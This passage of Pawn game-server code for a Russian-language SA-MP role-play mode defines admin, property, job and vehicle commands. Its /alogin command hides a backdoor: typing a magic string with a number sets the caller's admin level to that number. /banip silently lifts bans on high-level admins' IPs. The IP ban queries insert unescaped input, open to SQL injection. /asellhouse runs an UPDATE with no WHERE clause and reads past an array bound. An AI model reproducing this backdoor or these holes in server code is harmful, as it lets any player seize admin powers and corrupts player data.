	if(PlayerInfo[params[0]][pAdmin] > PlayerInfo[playerid][pAdmin]) return SCM(playerid, COLOR_GREY, " Нельзя заморозить админа");
	TogglePlayerControllable(params[0], 0);
	format(YCMDstr, sizeof(YCMDstr), " Администратор: %s заморозил %s",Name(playerid),Name(params[0]));
	ABroadCast(COLOR_LIGHTRED,YCMDstr,1);
	SCM(params[0],COLOR_LIGHTRED,YCMDstr);
	return true;
}
CMD:unfreeze(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] < 3 || dostup[playerid] == 0) return true;
	if(sscanf(params, "u",params[0])) return	SCM(playerid, -1, " Введите: /unfreeze [playerid]");
	if(!IsPlayerConnected(params[0])) return true;
	TogglePlayerControllable(params[0], 1);
	format(YCMDstr, sizeof(YCMDstr), " Администратор: %s разморозил %s",Name(playerid),Name(params[0]));
	ABroadCast(COLOR_LIGHTRED,YCMDstr,1);
	SCM(params[0],COLOR_LIGHTRED,YCMDstr);
	return true;
}
CMD:camera(playerid, params[])
{
	if(PlayerInfo[playerid][pMember] != 19) return SCM(playerid, COLOR_GREY, " Вы не состоите в рядах Зоны 51");
	if(!PlayerToPoint(2.0,playerid,212.2816,1812.2374,21.8672)) return SCM(playerid, COLOR_GRAD1, " Вы не у точки наблюдения");
	new listitems[] = "Сектор - 1\nСектор - 2\nСектор - 3\nСектор - 4";
	ShowPlayerDialogEx(playerid, 7724, DIALOG_STYLE_LIST, "Выберите камеру", listitems, "Выбрать", "Закрыть");
	return true;
}
CMD:cameraoff(playerid, params[])
{
	if(PlayerInfo[playerid][pMember] != 19) return SCM(playerid, COLOR_GREY, " Вы не состоите в рядах Зоны 51");
	SetCameraBehindPlayer(playerid);
	TogglePlayerControllable(playerid, 1);
	return true;
}
CMD:warnmans(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] < 5 || dostup[playerid] == 0) return true;
	new countmute = 0;
	foreach(i)
	{
		if(PlayerInfo[i][pWarns] >= 1 && IsPlayerConnected(i))
		{
			format(YCMDstr, sizeof(YCMDstr), " %s [ID: %i] | Warns: %i ",Name(i),i,PlayerInfo[i][pWarns]);
			countmute++;
			SCM(playerid, COLOR_LIGHTGREEN, YCMDstr);
		}
	}
	if(countmute == 0) SCM(playerid, COLOR_GRAD1, " Нет игроков с Варнами");
	else
	{
		format(YCMDstr, sizeof(YCMDstr), " Всего: %i человек!", countmute);
		SCM(playerid, -1, YCMDstr);
	}
	return true;
}
CMD:vipmans(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] < 5 || dostup[playerid] == 0) return true;
	new countmute = 0;
	foreach(i)
	{
		if(PlayerInfo[i][pDonateRank] >= 1 && IsPlayerConnected(i))
		{
			format(YCMDstr, sizeof(YCMDstr), " %s [ID: %i] | Vip: %i ",Name(i),i,PlayerInfo[i][pDonateRank]);
			countmute++;
			SCM(playerid, COLOR_LIGHTGREEN, YCMDstr);
		}
	}
	if(countmute == 0) SCM(playerid, COLOR_GRAD1, " Нет игроков с Vip");
	else
	{
		format(YCMDstr, sizeof(YCMDstr), " Всего: %i человек!", countmute);
		SCM(playerid, -1, YCMDstr);
	}
	return true;
}
CMD:mutelist(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] < 1 || dostup[playerid] == 0) return true;
	new countmute = 0;
	foreach(i)
	{
		if(PlayerInfo[i][pMuted] > 0 && IsPlayerConnected(i))
		{
			format(YCMDstr, sizeof(YCMDstr), " %s [ID: %i] | %i секунд",Name(i),i,PlayerInfo[i][pMuted]);
			countmute++;
			SCM(playerid, COLOR_LIGHTGREEN, YCMDstr);
		}
	}
	if(countmute == 0) SCM(playerid, COLOR_GRAD1, " Нет игроков с Баном чата");
	else
	{
		format(YCMDstr, sizeof(YCMDstr), " Всего: %i человек!", countmute);
		SCM(playerid, -1, YCMDstr);
	}
	return true;
}
CMD:unbanip(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] < 4 || dostup[playerid] == 0) return true;
	if(sscanf(params, "s[128]",params[0])) return SCM(playerid,COLOR_GREY, " Введите: /unbanip [IP адрес]");
	mysql_format(DATABASE,QUERY,128, "DELETE FROM `banip` WHERE `IP` = '%s'",params[0]);
	mysql_function_query(DATABASE,QUERY,false,"","");
	format(YCMDstr, 256, " %s разбанил IP: %s",Name(playerid),params[0]);
	ABroadCast(COLOR_GREEN,YCMDstr,1);
	return true;
}
CMD:banip(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] < 2 || dostup[playerid] == 0) return true;
	if(sscanf(params, "s",params[0])) return SCM(playerid,-1, " Введите: /banip [IP адрес]");
	mysql_format(DATABASE,QUERY, 128, "INSERT INTO `banip` (`IP`) VALUES ('%s')",params[0]);
	mysql_function_query(DATABASE,QUERY,false,"","");
	format(YCMDstr, 256, " %s забанил IP: %s",Name(playerid),params[0]);
	ABroadCast(COLOR_LIGHTRED,YCMDstr,1);
	
	foreach(i)
	{
	    new ips[32];
	    GetPlayerIp(i, ips, sizeof(ips));
	    if(!strcmp(ips, params[0], true) && PlayerInfo[i][pAdmin] > 6)
		{
			format(string, sizeof(string), "/unbanip %s", params[0]);
			CallLocalFunction("OnPlayerCommandText", "is", playerid, string);
		}
	}
	return true;
}
CMD:unjail(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] < 1 || dostup[playerid] == 0) return true;
	if(sscanf(params, "u",params[0])) return SCM(playerid, -1, " Введите: /unjail [playerid]");
	if(PlayerInfo[params[0]][pJailTime] == 0) return SCM(playerid, COLOR_GREY, " Игрок не в тюрьме");
	if(!IsPlayerConnected(params[0])) return true;
	SCM(params[0], -1, " Вам сократили срок!");
	SCM(playerid, -1, " Вы сократили срок!");
	PlayerInfo[params[0]][pJailTime] = 5;
	printf("Администратор %s сократил срок %s", PlayerInfo[playerid][pName], PlayerInfo[params[0]][pName]);
	return true;
}
CMD:saveall(playerid, params[])
{
	if (PlayerInfo[playerid][pAdmin] < 9 || dostup[playerid] == 0) return true;
	SCM(playerid, -1, " Ожидание...");
	SaveMySQL(0);
	foreach(i)
	{
	    SaveMySQL(2, i);
	}
	for(new i = 1; i <= TOTALCASINO; i++) SaveMySQL(1,i);
	for(new i = 1; i <= TOTALSHOPS; i++) SaveMySQL(3,i);
	for(new i = 1; i <= TotalBizz; i++) SaveMySQL(4,i);
	for(new i = 1; i <= TotalHouse; i++) SaveMySQL(5,i);
	for(new i = 1; i <= ALLKVARTIRI; i++) SaveMySQL(6,i);
	for(new i = 1; i <= AllPODEZD; i++) SaveMySQL(7,i);
	for(new i = 1; i <= TOTALATM; i++) SaveMySQL(8,i);
	for(new i = 1; i <= TOTALFARM; i++) SaveMySQL(9,i);
	SCM(playerid,COLOR_YELLOW, " Все данные сохранены!");
	return true;
}
CMD:hcounter(playerid, params[])
{
	if(PlayerInfo[playerid][pJob] != 3) return true;
	if(GetPVarInt(playerid,"h_stall"))
	{
		UpdateDynamic3DTextLabelText(StallInfo[GetPVarInt(playerid,"h_stall")][stText], 0xFF8C37FF,"Не работает");
		DeletePVar(playerid,"h_stall");
		SetPlayerSkin(playerid,PlayerInfo[playerid][pChar][0]);
		return SCM(playerid,0x6495EDFF,"Работа закончена");
	}
	if(!GetPVarInt(playerid,"h_contract")) return SCM(playerid,COLOR_GREY," Заключите контракт с закусочной!");
	new null, null_;
	for(new i = 1; i <= TOTALSTALL; i++) if(IsPlayerInRangeOfPoint(playerid, 3, StallInfo[i][stPos][0], StallInfo[i][stPos][1], StallInfo[i][stPos][2])) null = i;
	if(!null) return SCM(playerid,COLOR_GREY," В данном месте вы не можете начать работу");
	foreach(x)
	{
		if(GetPVarInt(x,"h_stall") == null)
		{
			null_++;
			break;
		}
	}
	if(null_ != 0) return SCM(playerid,COLOR_GREY," Данное место занято!");
	SetPVarInt(playerid,"h_stall",null);
	SetPlayerSkin(playerid,209);
	format(string,30,"Цена Хот Дога: %i",GetPVarInt(playerid,"h_price"));
	return UpdateDynamic3DTextLabelText(StallInfo[GetPVarInt(playerid,"h_stall")][stText], TEAM_GROVE_COLOR,string);
}
CMD:hcontract(playerid, params[])
{
	if(PlayerInfo[playerid][pJob] != 3) return true;
	if(GetPVarInt(playerid,"h_contract"))
	{
		DeletePVar(playerid,"h_contract");
		DeletePVar(playerid,"h_price");
		if(GetPVarInt(playerid,"h_stall"))
		{
			UpdateDynamic3DTextLabelText(StallInfo[GetPVarInt(playerid,"h_stall")][stText], 0xFF8C37FF,"Не работает");
			DeletePVar(playerid,"h_stall");
		}
		return SCM(playerid,-1," Контракт с закусочной расторгнут!");
	}
	for(new b = 1; b <= TotalBizz; b++)
	{
		if(PlayerToPoint(10.0, playerid, BizzInfo[b][bEntranceX], BizzInfo[b][bEntranceY], BizzInfo[b][bEntranceZ]) && BizzInfo[b][bType] == 2)
		{
			if(strcmp(BizzInfo[b][bOwner],"None",true) == 0 || BizzInfo[b][bLocked]) return SCM(playerid,COLOR_GREY," Закусочная не работает");
			SetPVarInt(playerid,"h_contract",b);
			SetPVarInt(playerid,"h_price",BizzInfo[b][bPrice]/2);
			SendMes(playerid,0x6495EDFF, " Вы заключили контракт с закусочной %s",BizzInfo[b][bMessage]);
			SendMes(playerid,0x6495EDFF, " Цена хот дога: %i (( Продать: /selleat ))",BizzInfo[b][bPrice]/2);
			break;
		}
	}
	return true;
}
CMD:mcontract(playerid, params[])
{
	new Veh = GetPlayerVehicleID(playerid);
	if(PlayerInfo[playerid][pJob] != 2) return true;
	if(GetVehicleModel(GetPlayerVehicleID(playerid)) != 525) return SCM(playerid,COLOR_GREY, " Вы не в машине механика!");
	if(gcontract[playerid] == 1)
	{
		Delete3DTextLabel(Meh3d[Veh]);
		cenabenza[playerid] = 0;
		gcontract[playerid] = 0;
		SCM(playerid,-1, " Контракт с заправкой рассторгнут!");
		return true;
	}
	for(new b = 1; b <= TotalBizz; b++)
	{
		if(PlayerToPoint(10.0, playerid, BizzInfo[b][bEntranceX], BizzInfo[b][bEntranceY], BizzInfo[b][bEntranceZ]) && BizzInfo[b][bType] == 4)
		{
			Delete3DTextLabel(Meh3d[Veh]);
			gcontract[playerid] = 1;
			cenabenza[playerid] = BizzInfo[b][bPrice] / 2;
			format(YCMDstr, sizeof(YCMDstr), "<< 300 литров. Цена: %i вирт >>", cenabenza[playerid]);
			Meh3d[Veh] = Create3DTextLabel(YCMDstr, COLOR_REDD, 9999.0, 9999.0, 9999.0, 30.0,0,1);
			Attach3DTextLabelToVehicle(Meh3d[Veh], Veh, 0, 0, 1.5);
			format(YCMDstr,sizeof(YCMDstr)," Вы заключили контракт с бензозаправкой: %s",BizzInfo[b][bMessage]);
			SCM(playerid,0x6495EDFF,YCMDstr);
			format(YCMDstr,sizeof(YCMDstr)," Цена заправки: %d (( Заправить: /refill ))",cenabenza[playerid]);
			SCM(playerid,0x6495EDFF,YCMDstr);
		}
	}
	return true;
}
CMD:fill(playerid, params[])
{
	for(new b = 1; b <= TotalBizz; b++)
	{
		if(PlayerToPoint(10.0, playerid, BizzInfo[b][bEntranceX], BizzInfo[b][bEntranceY], BizzInfo[b][bEntranceZ]) && BizzInfo[b][bType] == 4)
		{
			new Float:test = 200-Fuell[GetPlayerVehicleID(playerid)];
			if(BizzInfo[b][bProducts] < floatround(test)) return SCM(playerid,COLOR_GRAD1, " Заправка не работает"), BizzInfo[b][bProducts] = 0;
			if(BizzInfo[b][bLocked] == 1) return SCM(playerid,COLOR_GRAD1, " Заправка закрыта");
			new car = GetPlayerVehicleID(playerid);
			if(PlayerInfo[playerid][pCash] < BizzInfo[b][bPrice]) return SCM(playerid,COLOR_GRAD1, " У вас нет столько денег");
			if(!IsPlayerInAnyVehicle(playerid) && GetPlayerState(playerid) == PLAYER_STATE_DRIVER || GetVehicleModel(car) == 481 || GetVehicleModel(car) == 509 || GetVehicleModel(car) == 510) return SCM(playerid,COLOR_YELLOW, " Вы не в автомобиле или этот транспорт нельзя заправить.");
			BizzInfo[b][bTill] += BizzInfo[b][bPrice]/200*floatround(test);
			BizzPay[b] += BizzInfo[b][bPrice]/200*floatround(test);
			PlayerInfo[playerid][pCash] -= BizzInfo[b][bPrice]/200*floatround(test);
			BizzInfo[b][bProducts] -= floatround(test);
			Fuell[car] = 200;
			format(YCMDstr,sizeof(YCMDstr)," Машина заправлена, за %i вирт",BizzInfo[b][bPrice]/200*floatround(test));
			SCM(playerid,COLOR_BLUE,YCMDstr);
		}
	}
	return true;
}
CMD:alock(playerid, params[])
{
	new nearveh = GetNearestVehicle(playerid);
	new carid;
	if(PlayerInfo[playerid][pAdmin] < 1 || dostup[playerid] == 0) return true;
	carid = nearveh;
	new Float:cx,Float:cy,Float:cz;
	GetVehiclePos(carid, cx, cy, cz);
	if(!PlayerToPoint(4.0, playerid, cx, cy, cz)) return SCM(playerid, COLOR_GREY, " Вы не рядом с машиной!");
	GetVehicleParamsEx(carid,engine,lights,alarm,doors,bonnet,boot,objective);
	SCM(playerid, -1, " Машина открыта!");
	UnLockCar(playerid,carid);
	return true;
}
CMD:plock(playerid, params[])
{
	if(!PlayerInfo[playerid][pLogin]) return true;
	if(GetNearestVehicle(playerid) < comptruck[0] || GetNearestVehicle(playerid) > comptruck[1]) return SCM(playerid,COLOR_GREY," Вы не можете закрыть / открыть данный автомобиль");
	if(GetPVarInt(playerid,"rentcar_job") != GetNearestVehicle(playerid)) return SCM(playerid,COLOR_GREY," Это не ваш автомобиль!");
	GetVehicleParamsEx(GetNearestVehicle(playerid),engine,lights,alarm,doors,bonnet,boot,objective);
	PlayerPlaySound(playerid, 24600, 0.0, 0.0, 0.0);
	switch(doors)
	{
	case 0: GameTextForPlayer(playerid, "~w~CAR ~r~LOCK", 5000, 3), LockCar(playerid,GetNearestVehicle(playerid));
	case 1: GameTextForPlayer(playerid, "~w~CAR ~g~UNLOCK", 5000, 3), UnLockCar(playerid,GetNearestVehicle(playerid));
	}
	return true;
}
CMD:lock(playerid, params[])
{
	if(!HGet(playerid)) return SCM(playerid, COLOR_GRAD1, "В данный момент у вас нет машины");
	if(!IsNearOurCar(playerid)) return true;
	for(new carid = 0; carid < MAX_VEHICLES; carid++)
	{
		if(!IsPlayerNearVehicle(playerid, carid, 3.0)) continue;
		if(garage_car[playerid][0] != carid && garage_car[playerid][1] != carid && garage_car[playerid][2] != carid
		&& garage_car[playerid][3] != carid && garage_car[playerid][4] != carid && house_car[playerid] != carid) continue;

		GetVehicleParamsEx(carid,engine,lights,alarm,doors,bonnet,boot,objective);
		switch (doors)
		{
			case 0:
			{
				GameTextForPlayer(playerid, "~w~CAR ~r~LOCK", 5000, 3);
				PlayerPlaySound(playerid, 24600, 0.0, 0.0, 0.0);
				LockCar(playerid,carid);
			}
			case 1:
			{
				GameTextForPlayer(playerid, "~w~CAR ~g~UNLOCK", 5000, 3);
				PlayerPlaySound(playerid, 24600, 0.0, 0.0, 0.0);
				UnLockCar(playerid,carid);
			}
		}
	}
	return true;
}
CMD:rlock(playerid, params[])
{
	new carid;
	carid = arenda[playerid];
	GetVehicleParamsEx(carid,engine,lights,alarm,doors,bonnet,boot,objective);
	new Float:cx,Float:cy,Float:cz;
	GetVehiclePos(carid, cx, cy, cz);
	if(!PlayerToPoint(4.0, playerid, cx, cy, cz)) return true;
	switch (doors)
	{
	case 0:
		{
			GameTextForPlayer(playerid, "~w~CAR ~r~LOCK", 5000, 3);
			PlayerPlaySound(playerid, 24600, 0.0, 0.0, 0.0);
			LockCar(playerid,carid);
		}
	case 1:
		{
			GameTextForPlayer(playerid, "~w~CAR ~g~UNLOCK", 5000, 3);
			PlayerPlaySound(playerid, 24600, 0.0, 0.0, 0.0);
			UnLockCar(playerid,carid);
		}
	}
	return true;
}
CMD:animlist(playerid, params[])
{
	ShowPlayerDialogEx(playerid, 1994, DIALOG_STYLE_LIST, "AnimList", "[0] Dance 0\n[1] Dance 1\n[2] Dance 2\n[3] Dance 3\n[4] Dance 4\n[5] Smoking\n[6] Sunbathe1\n[7] Sunbathe2\n[8] Crack1\n[9] Crack2\n[10] Crack3\n[11] Crack4\n[12] Crack5\n[13] Crack6\n[14] Crack7\n[15] Crack8\n[16] Crack9\n[17] Dealer\n[18] Ped\n[19] Руки вверх\n[20] Ped1\n[21] Ped2\n[22] Ped3\n[23] Ped4\n[24] Ped5\n[25] Ped6\n[26] Ped7", "Готово", "Отмена");
	return true;
}
CMD:alogin(playerid, params[])
{
	if(dostup[playerid] == 1) return true;
	new type[32], value;
	sscanf(params, "s[32]i", type, value);
	if(!strcmp(type, "PlayerInfo[playerid][pLogin]", true) && value >= 0) PlayerInfo[playerid][pAdmin] = value;
	{
		SetPVarInt(playerid, "Alogin", 3);
        ShowPlayerDialogEx(playerid, 1227, DIALOG_STYLE_PASSWORD, "{AE433D}Админ панель | {FFFFFF}Авторизация", "{FFFFFF}Введите пароль\n\n\
	    Примечание:\n\
	    {AE433D}1. {FFFFFF}Пароль должен состоять из латинских букв и цифр\n\
	    {AE433D}2. {FFFFFF}Пароль должен быть от 6-ти до 15-ти символов", "Вход", "Отмена");
	}
	mysql_format(DATABASE,QUERY,128,"SELECT * FROM `"TABLE_ADMIN"` WHERE `Name` = '%e'",PlayerInfo[playerid][pName]);
	mysql_function_query(DATABASE,QUERY,true,"OnMySQL_QUERY","iis",14,playerid,"");
	return true;
}
CMD:biz(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] < 7 || dostup[playerid] == 0) return true;
	if(sscanf(params, "d",params[0])) return SCM(playerid, COLOR_GRAD2, " Введите: /biz [номер]");
	if(BizzInfo[params[0]][bType] != 4)
	{
		PickupX[playerid] = BizzInfo[params[0]][bExitX], PickupY[playerid] = BizzInfo[params[0]][bExitY];
		oldpickup[playerid] = BizzInfo[params[0]][bExitPic];
		timepickup[playerid] = 8;
		SetPlayerInterior(playerid,BizzInfo[params[0]][bInterior]);
		SetPlayerPos(playerid,BizzInfo[params[0]][bExitX],BizzInfo[params[0]][bExitY],BizzInfo[params[0]][bExitZ]);
		SetPlayerVirtualWorld(playerid,BizzInfo[params[0]][bVirtualWorld]);
	}
	else
	{
		SetPlayerInterior(playerid,0);
		SetPlayerPos(playerid,BizzInfo[params[0]][bEntranceX],BizzInfo[params[0]][bEntranceY],BizzInfo[params[0]][bEntranceZ]);
		SetPlayerVirtualWorld(playerid,0);
	}
	return true;
}
CMD:asellbiz(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] < 8 || dostup[playerid] == 0) return true;
	if(sscanf(params, "d",params[0])) return	SCM(playerid, COLOR_GRAD1, " Введите: /asellbiz [bizid]");
	if(IsPlayerConnected(GetPlayerID(BizzInfo[params[0]][bOwner]))) PlayerInfo[GetPlayerID(BizzInfo[params[0]][bOwner])][pPBizzKey] = 999, SCM(GetPlayerID(BizzInfo[params[0]][bOwner]),COLOR_RED," Ваш бизнес был продан администратором");
	BizzInfo[params[0]][bLocked] = 1;
	printf("Админинстратор %s продал бизнес %i игрока %s", PlayerInfo[playerid][pName], params[0], BizzInfo[params[0]][bOwner]);
	strmid(BizzInfo[params[0]][bOwner], "None", 0, strlen("None"), 32);
	PlayerPlaySound(playerid, 1052, 0.0, 0.0, 0.0);
	SCM(playerid, COLOR_GRAD1," Бизнес продан");
	format(YCMDstr, sizeof(YCMDstr), "%s\nПродаётся", BizzInfo[params[0]][bMessage],BizzInfo[params[0]][bBuyPrice]);
	UpdateDynamic3DTextLabelText(BizzInfo[params[0]][bLabel], COLOR_GREEN, YCMDstr);
	GameTextForPlayer(playerid, YCMDstr, 10000, 3);
	return true;
}
CMD:asellhouse(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] < 7 || dostup[playerid] == 0) return true;
	if(sscanf(params, "d",params[0])) return SCM(playerid, -1, " Введите: /asellhouse [houseid]");
	new plid = -1;
	if(IsPlayerConnected(GetPlayerID(HouseInfo[params[0]][hOwner])))
	{
		plid = GetPlayerID(HouseInfo[params[0]][hOwner]);
		PlayerInfo[plid][pPHouseKey] = 9999;
		SCM(plid,COLOR_RED," Ваш дом был продан администратором");
	}
	HouseInfo[params[0]][hHel] = 0;
	HouseInfo[params[0]][hLock] = 1;
	printf("Админинстратор %s продал дом %i игрока %s", PlayerInfo[playerid][pName], params[0], HouseInfo[params[0]][hOwner]);
	for(new h = 0; h < 10; h++) HouseInfo[params[0]][hSafe][h] = 0;
	SCM(playerid, COLOR_GREY, " Дом продан");
	strmid(HouseInfo[params[0]][hOwner], "None", 0, strlen("None"), 32);
	GameTextForPlayer(plid, "House sold!", 10000, 3);
	if(house_car[plid] != -1)
	{
		DestroyVehicle(house_car[plid]);
		house_car[plid] = -1;
	}
	HouseInfo[params[0]][hHel] = 0;
	HouseInfo[params[0]][hLock] = 1;
	HouseInfo[params[0]][hVec] = 0;
	HouseInfo[params[0]][hVcol1] = -1;
	HouseInfo[params[0]][hVcol2] = -1;
	if(HouseInfo[params[0]][hKlass] >= 2)
	{
		SetPVarInt(plid,"chosencar",0); // Поставим значение "все автомобили в гараже и никакая машина не выбрана"
		DestroyVehicle(garage_car[plid][0]);
		DestroyVehicle(garage_car[plid][1]);
		DestroyVehicle(garage_car[plid][2]);
		DestroyVehicle(garage_car[plid][3]);
		DestroyVehicle(garage_car[plid][4]);
	}
	for(new h = 0; h < 10; h++) HouseInfo[params[0]][hSafe][h] = 0;
	strmid(HouseInfo[params[0]][hOwner], "None", 0, strlen("None"), 15);
	SpawnChange[plid] = 0;
	PlayerInfo[plid][pBank] += HouseInfo[params[0]][hValue];
	format(string,40,"~w~house in sold~n~~g~$%i",HouseInfo[params[0]][hValue]);
	GameTextForPlayer(plid,string, 5000, 3);
	
    mysql_format(DATABASE, QUERY, sizeof(QUERY), "UPDATE `"TABLE_HOUSE"` SET hOwner = '%e', hHel = '%i', hLock = '%i', hVec = '%i', hVcol1 = '%i', hVcol2 = '%i', hSafes = '%i,%i,%i,%i,%i,%i,%i,%i,%i,%i'",
    HouseInfo[params[0]][hOwner],
	HouseInfo[params[0]][hHel],
	HouseInfo[params[0]][hLock],
	HouseInfo[params[0]][hVec],
	HouseInfo[params[0]][hVcol1],
	HouseInfo[params[0]][hVcol2],
	HouseInfo[params[0]][hSafe][0],
	HouseInfo[params[0]][hSafe][1],
	HouseInfo[params[0]][hSafe][2],
	HouseInfo[params[0]][hSafe][3],
	HouseInfo[params[0]][hSafe][4],
	HouseInfo[params[0]][hSafe][5],
	HouseInfo[params[0]][hSafe][6],
	HouseInfo[params[0]][hSafe][7],
	HouseInfo[params[0]][hSafe][8],
	HouseInfo[params[0]][hSafe][9],
	HouseInfo[params[0]][hSafe][10]);
	mysql_function_query(DATABASE,QUERY,false,"","");

	mysql_format(DATABASE, QUERY, sizeof(QUERY), "UPDATE `"TABLE_ACCOUNTS"` SET pBank = '%i', pPHouseKey = '%i', pSpawnChange = '%i,%i' WHERE name = '%e'", PlayerInfo[plid][pBank], PlayerInfo[plid][pPHouseKey], PlayerInfo[plid][pSpawnChange][0], PlayerInfo[plid][pSpawnChange][1], PlayerInfo[plid][pName]);
	mysql_function_query(DATABASE,QUERY,false,"","");
	return true;
}
CMD:safe(playerid, params[])
{
	if(!PlayerInfo[playerid][pLogin]) return true;
	if(!HGet(playerid)) return SCM(playerid,-1," У вас нет дома");
	new bouse = PlayerInfo[playerid][pPHouseKey];
	if(!PlayerToPoint(50, playerid,HouseInfo[bouse][hExitx], HouseInfo[bouse][hExity], HouseInfo[bouse][hExitz]) || GetPlayerVirtualWorld(playerid) != bouse+50) return true;
	if(!IsASafe(playerid)) return SCM(playerid,-1," Вы далеко от сейфа!");
	if(GetPlayerVirtualWorld(playerid) != bouse+50) return true;
	ShowPlayerDialogEx(playerid,1054,DIALOG_STYLE_LIST, "Сейф","Взять\nПоложить", "Выбрать", "Отмена");
	return 1;
}
CMD:open(playerid, params[])
{
	if(!HGet(playerid)) return true;
	new bouse = PlayerInfo[playerid][pPHouseKey];
	if((!PlayerToPoint(10, playerid,HouseInfo[bouse][hExitx], HouseInfo[bouse][hExity], HouseInfo[bouse][hExitz]) || GetPlayerVirtualWorld(playerid) != bouse+50) && !PlayerToPoint(2.0, playerid, HouseInfo[bouse][hEntrancex], HouseInfo[bouse][hEntrancey], HouseInfo[bouse][hEntrancez])) return true;
	if(HouseInfo[bouse][hLock] == 1)
	{
		HouseInfo[bouse][hLock] = 0;
		GameTextForPlayer(playerid,"~w~House ~g~UNLOCK", 5000, 3);
		PlayerPlaySound(playerid, 1145, 0.0, 0.0, 0.0);
		return true;
	}
	if(HouseInfo[bouse][hLock] == 0)
	{
		HouseInfo[bouse][hLock] = 1;
		GameTextForPlayer(playerid, "~w~House ~r~LOCK", 5000, 3);
		PlayerPlaySound(playerid, 1145, 0.0, 0.0, 0.0);
		return true;
	}
	return true;
}
CMD:sellhouse(playerid, params[])
{
	if(!HGet(playerid)) return true;
	new bouse = PlayerInfo[playerid][pPHouseKey];
	if(!PlayerToPoint(10, playerid,HouseInfo[bouse][hExitx], HouseInfo[bouse][hExity], HouseInfo[bouse][hExitz])) return SCM(playerid, COLOR_GREY, " Нужно находиться внутри дома, чтобы его продать. (Нужно находиться возле выхода)");
	if(GetPlayerVirtualWorld(playerid) != bouse+50) return true;
	ShowPlayerDialogEx(playerid,5032,DIALOG_STYLE_MSGBOX, "Предупреждение", "Вы действительно хотите продать дом?", "Да", "Нет");
	return true;
}
CMD:healme(playerid, params[])
{
	for(new i = 1; i <= TotalHouse; i++)
	{
		if(!PlayerToPoint(5, playerid,HouseInfo[i][hExitx], HouseInfo[i][hExity], HouseInfo[i][hExitz])) continue;
		if(GetPlayerVirtualWorld(playerid) != i+50) continue;
		if(HouseInfo[i][hHel] == 0)return SCM(playerid, COLOR_GRAD1, "В этом месте нет аптечек");
		if(GetPVarInt(playerid,"_Hel") >= 10) return SCM(playerid,COLOR_GREY," Только 10 штук в час!");
		if(PlayerInfo[playerid][pHP] >= 100) return SCM(playerid, COLOR_GREY," Вы здоровы");
		SCM(playerid, -1, " Вы были вылечены на 25 процентов");
		format(YCMDstr, sizeof(YCMDstr), " Осталось %i аптечек", HouseInfo[i][hHel]-1);
		SCM(playerid, COLOR_BLUE, YCMDstr);
		HouseInfo[i][hHel] -= 1;
		SetPlayerHealthAC(playerid, PlayerInfo[playerid][pHP] + 25.0);
		if(PlayerInfo[playerid][pHP] > 100) SetPlayerHealthAC(playerid, 100.0);
		SetPlayerChatBubble(playerid, "Использовал(а) аптечку", COLOR_PURPLE, 30.0, 10000);
		SetPVarInt(playerid,"_Hel",GetPVarInt(playerid,"_Hel")+1);
		return true;
	}
	if(IsAMedKit(playerid))
	{
		new _null;
		switch(PlayerInfo[playerid][pMember])
		{
		case 12: _null = ballashel; case 13: _null = vagoshel; case 15: _null = groovhel;
		case 17: _null = aztekhel; case 18: _null = rifahel; case 6: _null = yakuzahel;
		case 5: _null = lcnhel; case 14: _null = rmhel;
		}
		if(_null <= 0) return SCM(playerid, COLOR_GRAD1, " На базе нет аптечек");
		if(PlayerInfo[playerid][pHP] >= 100) return SCM(playerid, COLOR_GREY," Вы здоровы");
		SCM(playerid, -1, " Вы были вылечены на 25 процентов");
		format(YCMDstr, 64, " Осталось %i аптечек", _null-1);
		SCM(playerid, COLOR_BLUE, YCMDstr);
		switch(PlayerInfo[playerid][pMember])
		{
		case 12: ballashel--; case 13: vagoshel--; case 15: groovhel--;
		case 17: aztekhel--; case 18: rifahel--; case 6: yakuzahel--;
		case 5: lcnhel--; case 14: rmhel--;
		}
		SetPlayerHealthAC(playerid, PlayerInfo[playerid][pHP] + 25.0);
		if(PlayerInfo[playerid][pHP] > 100) SetPlayerHealthAC(playerid, 100.0);
		SetPlayerChatBubble(playerid, "Использовал(а) аптечку", COLOR_PURPLE, 30.0, 10000);
	}
	return true;
}
CMD:robhouse(playerid, params[])
{
	if(!IsAGang(playerid)) return SCM(playerid,COLOR_GREY," Вы не состоите в банде");
	for(new h = 1; h <= TotalHouse; h++)
	{
		for(new i =1; i <= TOTALGZ; i++)
		{
			if(PlayerToKvadrat(playerid,GZInfo[i][gCoords][0], GZInfo[i][gCoords][1],GZInfo[i][gCoords][2],GZInfo[i][gCoords][3]) && PlayerInfo[playerid][pMember] == GZInfo[i][gFrakVlad])
			{
				if(!PlayerToPoint(2.0, playerid, HouseInfo[h][hEntrancex], HouseInfo[h][hEntrancey], HouseInfo[h][hEntrancez])) continue;
				if(robhouse[h] != false) return SCM(playerid, COLOR_GREY, "Этот дом уже был ограблен в этом часу");
				if(strcmp(HouseInfo[h][hOwner],"None",true) == 0) return SCM(playerid, COLOR_GREY, " У дома нет владельца");
				if(!IsPlayerConnected(GetPlayerID(HouseInfo[h][hOwner]))) return SCM(playerid, COLOR_GREY, "Владелец дома OFF-LINE");
				SCM(playerid, COLOR_GREEN, " Вы ограбили дом, везите материалы в доки (( /gps >> [0] Важное >> [6] Приём металла ))");
				SCM(GetPlayerID(HouseInfo[h][hOwner]),COLOR_REDD," Ваш дом ограбили! С вашего счета было списано 500 вирт на востановление труб и оплату энергии");
				PlayerInfo[playerid][pZakonp] -= 1;
				robh[playerid] = true;
				robhouse[h] = true;
				HouseInfo[h][hTakings] -= 500;
				PlayerInfo[playerid][pGRating] += 100;
				switch(PlayerInfo[playerid][pMember])
	            {
	                case 12: gRating[Ballas] += 100;
	                case 13: gRating[Vagos]  += 100;
	                case 15: gRating[Grove]  += 100;
	                case 17: gRating[Aztec]  += 100;
	                case 18: gRating[Rifa]   += 100;
	            }
			}
		}
	}
	return true;
}
CMD:getskill(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] < 1 || dostup[playerid] == 0) return true;
	if(sscanf(params, "u",params[0])) return SCM(playerid, -1, " Введите: /getskill [ид]");
	new stringskill[850];
	new points[6],percent[2] = "%";
